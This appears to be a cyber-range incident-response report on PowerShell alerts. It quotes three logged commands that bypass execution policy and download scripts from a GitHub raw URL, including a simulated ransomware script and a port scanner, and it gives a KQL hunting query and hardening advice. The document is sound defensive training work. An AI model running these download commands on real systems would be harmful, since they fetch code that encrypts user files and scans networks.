# Detection and Analysis

- During investigating the triggered incident : "Karan PowerShell-Suspicious-Web-Request", it was discovered that three (3) different powershell scripts were ran by the user "Josh" on device name : "windows-target-" 
- Below are the powershell scripts with timestamp :
	1. `powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
		- Timestamp : 2026-04-15T08:13:03.3125797Z

	2. `powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
		- Timestamp : 2026-04-15T08:24:56.6948076Z
	
	3. `powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1 `
		- Timestamp : 2026-04-15T08:37:00.6299086Z

```kql
let _StartTime = datetime(2026-4-15T05:42:00);
let _EndTime = datetime(2026-4-16T10:06:00);
DeviceProcessEvents
| where DeviceName == "windows-target-"
| where TimeGenerated between ((_StartTime - 1m) .. (_EndTime + 1m) )
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| project TimeGenerated , DeviceName , AccountName , ActionType , FileName ,ProcessCommandLine , InitiatingProcessCommandLine , FileSize
| sort by TimeGenerated asc 
```

- The powershell script created three (3) files in "C:\programdata" folder
- File names : 
	1. "eicar.ps1"
	2. "pwncrypt.ps1"
	3. "portscan.ps1"

---
- I contacted the device owner "Josh" to know about how he ran the powershell script , he told me that he was trying to install some free piece of software and when he ran the software , suddenly a black screen appears and then nothing happened. 
---
- The suspected powershell files were sent to "malware analysis and reverse engineering"  team 
- Below are the one-line script working description :
	1. File name :  "eicar.ps1"
		- Working : A PowerShell script that creates a standard EICAR antivirus test file in `C:\ProgramData` (after removing any existing one) and logs the activity to simulate malware detection testing
	
	2. File name : "pwncrypt.ps1"
		- Working : A PowerShell script that creates fake sensitive files on a random user’s desktop, encrypts them with AES, deletes/replaces originals, and drops a ransom note—simulating ransomware behavior while logging activity
	
	3. File name :  "portscan.ps1"
		- Working : A PowerShell script that scans a range of internal IPs, checks common ports on live hosts using `Test-NetConnection`, and logs open/closed ports—simulating network reconnaissance activity

---

# Containment

- The impacted virtual machines were isolated to prevent further attacks 
- A full antivirus/endpoint scan was conducted on all affected systems:
    - Several malicious artifacts or post-compromise activity were detected
- The re-image of the device request was generated to the respected team 

---

# Recommendations

- Enforce PowerShell security controls such as **Constrained Language Mode** and restrict use of `-ExecutionPolicy Bypass` via Group Policy
- Block or monitor access to raw script hosting domains (e.g., GitHub raw URLs) to prevent unauthorized script downloads
- Implement **application control** (e.g., allowlisting) to restrict execution of unapproved scripts and binaries
- Enhance endpoint detection rules to flag suspicious PowerShell behaviors (e.g., `Invoke-WebRequest`, file drops in `C:\ProgramData`)
- Conduct **user awareness training** to discourage downloading and executing untrusted software
- Apply the **principle of least privilege** to limit user ability to execute high-risk commands

---
